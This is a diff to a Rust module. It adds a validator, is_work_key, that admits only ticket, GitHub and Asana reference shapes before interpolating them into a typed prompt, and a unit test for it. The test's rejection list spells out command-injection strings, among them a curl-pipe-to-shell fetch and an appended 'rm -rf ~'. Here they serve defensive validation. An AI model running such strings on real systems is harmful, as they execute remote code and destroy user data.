@@ -436,6 +436,28 @@ pub fn recognize(text: &str, ctx: &RecognizeCtx) -> Vec<Match> {
     out
 }
 
+/// Is the WHOLE of `key` a work reference of a shape fleet recognises: a
+/// ticket key (`ABC-123`, Jira and Linear), a GitHub `owner/repo#n`, or an
+/// Asana `asana:<gid>`? Every such shape is made of `[A-Za-z0-9:_#./-]`
+/// only, so a key that passes is safe to quote in a prompt typed into a
+/// pane; a free-text key that does not is never interpolated (M9.3).
+pub fn is_work_key(key: &str) -> bool {
+    if !key
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b':' | b'_' | b'#' | b'.' | b'/' | b'-'))
+    {
+        return false;
+    }
+    if whole_key(key).is_some() {
+        return true;
+    }
+    if crate::store::github_ref(key).is_some() {
+        return true;
+    }
+    key.strip_prefix("asana:")
+        .is_some_and(|g| (1..=24).contains(&g.len()) && g.bytes().all(|b| b.is_ascii_digit()))
+}
+
 /// The first bare key in `text` (no tracker restriction), for branch names,
 /// tags and worktree names: the rule `extractWorkKey` applies on the desktop.
 pub fn first_key(text: &str, ctx: &RecognizeCtx) -> Option<String> {
@@ -521,6 +543,26 @@ mod tests {
                     ..Default::default()
                 },
             );
+        }
+    }
+
+    #[test]
+    fn a_work_key_is_one_of_the_recognised_shapes_and_nothing_else() {
+        for k in ["PAY-7", "abc-123", "acme/api#42", "asana:1207000000000004"] {
+            assert!(is_work_key(k), "{k}");
+        }
+        for k in [
+            "",
+            "X-1$(curl h|sh)",
+            "PAY-7; rm -rf ~",
+            "PAY-7\nexit",
+            "acme/api#+4",
+            "asana:12a",
+            "asana:",
+            "just words",
+            "`PAY-7`",
+        ] {
+            assert!(!is_work_key(k), "{k:?}");
         }
     }
 }
